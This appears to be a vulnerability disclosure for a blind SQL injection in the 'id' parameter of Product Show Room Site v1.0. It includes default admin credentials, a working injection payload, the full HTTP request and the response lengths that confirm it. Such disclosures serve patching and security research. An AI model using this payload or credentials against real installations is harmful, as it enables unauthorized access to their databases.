# Product Show Room Site v1.0 by oretnom23 has SQL injection

The password for the backend login account is: admin/admin123

vendors: https://www.sourcecodester.com/php/15370/product-show-room-site-phpoop-free-source-code.html

Vulnerability File: /psrs/admin/categories/view_category.php?id=

Vulnerability location: /psrs/admin/categories/view_category.php?id=, id

Current database name: hsrs_db ,length is 7

[+] Payload: /psrs/admin/categories/view_category.php?id=1%27%20and%20length(database())%20=7--+ // Leak place ---> id

```sql
GET /psrs/admin/categories/view_category.php?id=1%27%20and%20length(database())%20=7--+ HTTP/1.1
Host: 192.168.1.19
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Cookie: PHPSESSID=7g6mvmuq5m1o1cvqrhprll4jr1
Connection: close
```

When length (database ()) = 6, Content-Length: 780
![image](https://user-images.githubusercontent.com/54017627/171829131-88845078-4173-4b1f-9015-c7166a4482f9.png)

![image](https://user-images.githubusercontent.com/54017627/171829197-2f58b772-5f19-45cc-9d8c-b9dd3c03d2de.png)

When length (database ()) = 7, Content-Length: 552
![image](https://user-images.githubusercontent.com/54017627/171829092-bbd260b8-c7e2-446b-9e34-f7d0407b1abb.png)

![image](https://user-images.githubusercontent.com/54017627/171829155-59c0b012-8187-4141-b8a3-32aa2ba83dfa.png)
